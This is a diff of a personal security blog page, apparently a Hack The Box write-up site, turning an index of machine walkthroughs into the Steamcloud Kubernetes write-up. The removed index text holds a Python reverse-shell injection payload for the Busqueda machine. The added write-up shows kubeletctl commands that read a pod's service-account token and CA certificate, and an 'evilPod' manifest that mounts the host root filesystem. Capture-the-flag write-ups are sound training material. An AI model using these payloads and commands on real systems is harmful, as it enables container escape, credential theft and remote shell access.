@@ -44,41 +44,43 @@
 
 
   
+
+
+
+
+
   
-
-
-
-
+  
+  
 
 
 <!-- Open Graph image and Twitter Card metadata -->
 
-<title itemprop="name">sysevil</title>
-<meta property="og:title" content=sysevil />
-<meta name="twitter:title" content=sysevil />
-<meta itemprop="name" content=sysevil />
-<meta name="application-name" content=sysevil />
+<title itemprop="name">sysevil - Steamcloud</title>
+<meta property="og:title" content=sysevil&#32;-&#32;Steamcloud />
+<meta name="twitter:title" content=sysevil&#32;-&#32;Steamcloud />
+<meta itemprop="name" content=sysevil&#32;-&#32;Steamcloud />
+<meta name="application-name" content=sysevil&#32;-&#32;Steamcloud />
 <meta property="og:site_name" content="" />
 
 
-<meta name="description" content="I am a (security|dev) researcher focus on 👁️🪲" />
-<meta itemprop="description" content="I am a (security|dev) researcher focus on 👁️🪲" />
-<meta property="og:description" content="I am a (security|dev) researcher focus on 👁️🪲" />
-<meta name="twitter:description" content="I am a (security|dev) researcher focus on 👁️🪲" />
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
 
 
-<base href="https://sysevil.github.io/" />
-<link rel="canonical" href="https://sysevil.github.io/" itemprop="url" />
-<meta name="url" content="https://sysevil.github.io/" />
-<meta name="twitter:url" content="https://sysevil.github.io/" />
-<meta property="og:url" content="https://sysevil.github.io/" />
+<base href="https://sysevil.github.io/htb/steamcloud/" />
+<link rel="canonical" href="https://sysevil.github.io/htb/steamcloud/" itemprop="url" />
+<meta name="url" content="https://sysevil.github.io/htb/steamcloud/" />
+<meta name="twitter:url" content="https://sysevil.github.io/htb/steamcloud/" />
+<meta property="og:url" content="https://sysevil.github.io/htb/steamcloud/" />
 
 
-<meta property="og:updated_time" content=14002-14-05T221:12:24-0300 />
+<meta property="og:updated_time" content=14002-14-04T259:48:24-0300 />
 
 
 <link rel="sitemap" type="application/xml" title="Sitemap" href='https://sysevil.github.io/sitemap.xml' />
-<link href="https://sysevil.github.io/index.xml" rel="alternate" type="application/rss+xml" title="" />
 
 <meta name="robots" content="index,follow" />
 <meta name="googlebot" content="index,follow" />
@@ -340,181 +342,8 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </aside>
 
             <main class="content container">
-                <div class="posts">
-    
-    
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://sysevil.github.io/htb/devvortex/">Devvortex</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      <time datetime=" 2024-02-14T17:21:12-0300" class="post-date">
-        February 14, 2024
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>3 mins read</span>
-      </span>
-    </div>
-
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        #joomla IP: 10.10.11.242 OS: Linux
-PortScanner nmap --min-rate 1000 -sV -sC -p- -oG fullscan 10.10.11.242 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-06 09:41 -03 Nmap scan report for 10.10.11.242 (10.10.11.242) Host is up (0.21s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http nginx 1.
-        
-        <div class="read-more-link">
-            <a href="/htb/devvortex/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://sysevil.github.io/htb/busqueda/">Busqueda</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      <time datetime=" 2024-02-14T17:19:08-0300" class="post-date">
-        February 14, 2024
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>2 mins read</span>
-      </span>
-    </div>
-
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        #searcho Os: Linux | Easy ip: 10.10.11.208
-Web: - Werkzeug/2.1.2 Python/3.10.6 - Flask Python - Framework ? Searchor 2.4.0
-Exploits: - https://raw.githubusercontent.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/main/exploit.sh ( searchor 2.4.0) - Exploit: https://github.com/jonnyzar/POC-Searchor-2.4.2
-Reverse shell with searcho-exploit Exploit payload request: POST /search HTTP/1.1 Host: searcher.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 283 Origin: http://searcher.htb Connection: close Referer: http://searcher.htb/search Upgrade-Insecure-Requests: 1 engine=Amazon&amp;query=&#39;%20,%20exec(&#34;import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;10.10.14.11&#39;,80));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/sh&#39;,&#39;-i&#39;]);&#34;))#&amp;auto_redirect=10.10.14.11 Attacker machine Upgrade shell to TTY shell python3 -c &#39;import pty; pty.
-        
-        <div class="read-more-link">
-            <a href="/htb/busqueda/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://sysevil.github.io/htb/builder/">Builder</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      <time datetime=" 2024-02-14T17:16:46-0300" class="post-date">
-        February 14, 2024
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>5 mins read</span>
-      </span>
-    </div>
-
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        IP: 10.10.11.10 OS: Linux Difficult: medium
-Port Scanner sudo nmap --min-rate 1000 -p- -T4 -sV 10.10.11.10 -oG full_scan [sudo] password for parallels: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-12 20:17 -03 Nmap scan report for 10.10.11.10 (10.10.11.10) Host is up (0.13s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) 8080/tcp open http Jetty 10.
-        
-        <div class="read-more-link">
-            <a href="/htb/builder/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://sysevil.github.io/htb/bizness/">Bizness</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      <time datetime=" 2024-02-14T17:10:40-0300" class="post-date">
-        February 14, 2024
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>3 mins read</span>
-      </span>
-    </div>
-
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        #obfiz IP: 10.10.11.252
-Port Scan sudo nmap --min-rate 1000 -p- -T4 -sV 10.10.11.252 -oG full_scan [sudo] password for parallels: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-05 18:25 -03 Warning: 10.10.11.252 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.11.252 (10.10.11.252) Host is up (0.13s latency). Not shown: 65290 closed tcp ports (reset), 241 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.
-        
-        <div class="read-more-link">
-            <a href="/htb/bizness/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
+                <div class="post">
+  <div class="info">
   <h1 class="post-title">
     <a href="https://sysevil.github.io/htb/steamcloud/">Steamcloud</a>
   </h1>
@@ -545,22 +374,151 @@ Port Scan sudo nmap --min-rate 1000 -p- -T4 -sV 10.10.11.252 -oG full_scan [sudo
   
 </div>
 
+  <h2 id="kubernetes-cloud">Machine: Linux
+Difficult: Easy
+#Kubernetes #cloud</h2>
+<p>IP: 10.10.14.149</p>
+<h4 id="portscanner">PortScanner</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-02-14 08:33 -03
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.133 <span style="color:#f92672">(</span>10.10.11.133<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65529</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE          VERSION
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>2379/tcp  open  ssl/etcd-client?
+</span></span><span style="display:flex;"><span>2380/tcp  open  ssl/etcd-server?
+</span></span><span style="display:flex;"><span>8443/tcp  open  ssl/https-alt
+</span></span><span style="display:flex;"><span>10249/tcp open  http             Golang net/http server <span style="color:#f92672">(</span>Go-IPFS json-rpc or InfluxDB API<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>10250/tcp open  ssl/http         Golang net/http server <span style="color:#f92672">(</span>Go-IPFS json-rpc or InfluxDB API<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h4 id="dirscanner">DirScanner</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>  _|. _ _  _  _  _ _|_    v0.4.3
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">(</span>_<span style="color:#f92672">||</span>| _<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>/_<span style="color:#f92672">(</span>_<span style="color:#f92672">||</span> <span style="color:#f92672">(</span>_| <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Extensions: php, asp, aspx, jsp, md, text, bak, zip, toml, conf | HTTP method: GET | Threads: <span style="color:#ae81ff">25</span> | Wordlist size: <span style="color:#ae81ff">14139</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Output File: /home/parallels/reports/http_10.10.11.133_10249/_24-02-14_08-38-31.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://10.10.11.133:10249/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>08:38:31<span style="color:#f92672">]</span> Starting: 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>08:39:17<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2B  - /healthz                                          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>08:39:25<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   37KB - /metrics          
+</span></span></code></pre></div><h4 id="kubernets-api">Kubernets API</h4>
+<p><img src="/markdown-export-output-attachments/d5f58c8aaa4bb6cb29daf1099283f60d.png" alt=""></p>
+<ul>
+<li>
+<p>Install <code>kubeletctl</code></p>
+<ul>
+<li><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/" target="_blank">https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/</a></li>
+</ul>
+</li>
+<li>
+<p>list all the pods on the node
+<img src="/markdown-export-output-attachments/679183fd7db889ce00dd5a5be69a3407.png" alt=""></p>
+</li>
+<li>
+<p>List the running pods
+<img src="/markdown-export-output-attachments/a6e53f3d0ef9d9d36eee99143f151dab.png" alt=""></p>
+</li>
+</ul>
+<blockquote>
+<p>Select the only one that not have the &ldquo;kubesystem&rdquo; in that case the <strong>nginx</strong></p>
+</blockquote>
+<p><img src="/markdown-export-output-attachments/3c3168b4af3aa7f5a2557e29a044af23.png" alt=""></p>
+<h4 id="usertxt">user.txt</h4>
+<p><img src="/markdown-export-output-attachments/58ef05d9a2d08772a2507046661d049a.png" alt=""></p>
+<h4 id="roottxt">root.txt</h4>
+<ul>
+<li>We need to get the <strong>ca.cert</strong> and <strong>token</strong> to authenticate into the cluster</li>
+</ul>
+<p><img src="/markdown-export-output-attachments/3e5b1107660ca8dcd646c594b158ce8e.png" alt=""></p>
+<ul>
+<li>Grab the token
+<ul>
+<li><code>kubeletctl -s 10.10.11.133 exec &quot;cat /run/secrets/kubernetes.io/serviceaccount/token&quot; -p nginx -c nginx</code></li>
+</ul>
+</li>
+<li>Grab the C.A
+<ul>
+<li><code>./kubeletctl -s 10.10.11.133 exec &quot;cat /run/secrets/kubernetes.io/serviceaccount/ca.crt&quot; -p nginx -c nginx | tee ca.crt</code></li>
+</ul>
+</li>
+<li>Verify the information where you can find the <code>create</code> permission using the token and the C.A.
+<ul>
+<li><code>kubectl auth can-i --list --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token</code></li>
+</ul>
+</li>
+<li>Using the <code>official</code> command line <code>kubectl</code></li>
+</ul>
+<p><img src="/markdown-export-output-attachments/9a60b02779e58ab6c5ef21a9dbfb21b0.png" alt=""></p>
+<p><code>kubectl get pod nginx -o yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token</code></p>
+<p><img src="/markdown-export-output-attachments/ac11bb4f18d9c75b671c49e7d9db9f76.png" alt=""></p>
+<blockquote>
+<p> create a pod (container) that has the root file system mapped into it. Then I can execute in the pod, and access the mapped volume, which is the full file system of the host.</p>
+</blockquote>
+<ul>
+<li>Evil file</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1 </span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">evilPod</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">default</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">containers</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">evilPod</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">nginx:1.14.2</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumeMounts</span>: 
+</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/mnt</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">name</span>: <span style="color:#ae81ff">hostfs</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">hostfs</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">hostPath</span>:  
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">automountServiceAccountToken</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">hostNetwork</span>: <span style="color:#66d9ef">true</span>
+</span></span></code></pre></div><p><code>kubectl apply -f r.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$(cat token)</code></p>
+<p><img src="/markdown-export-output-attachments/5b84517a2546ed39cd33958ab2b61f1c.png" alt=""></p>
+<p><img src="/markdown-export-output-attachments/151b5265b32ab3be32e7d88f763554b9.png" alt=""></p>
+<p><img src="/markdown-export-output-attachments/d6731fc63bd76802d38dc97262330528.png" alt=""></p>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+	    
+            <div class="next-post">
+                <a href="https://sysevil.github.io/htb/bizness/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Bizness</a>
+            </div>
         
-        Machine: Linux Difficult: Easy #Kubernetes #cloud IP: 10.10.14.149
-PortScanner Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-14 08:33 -03 Nmap scan report for 10.10.11.133 (10.10.11.133) Host is up (0.13s latency). Not shown: 65529 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 2379/tcp open ssl/etcd-client? 2380/tcp open ssl/etcd-server? 8443/tcp open ssl/https-alt 10249/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) 10250/tcp open ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) DirScanner _|.
-        
-        <div class="read-more-link">
-            <a href="/htb/steamcloud/">Read More…</a>
-        </div>
-        
-        
-    </article>
+    
 </div>
 
-
-
+  
+</div>
             </main>
             
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#kubernetes-cloud">Machine: Linux
+Difficult: Easy
+#Kubernetes #cloud</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
         </div>
     </body>
 </html>
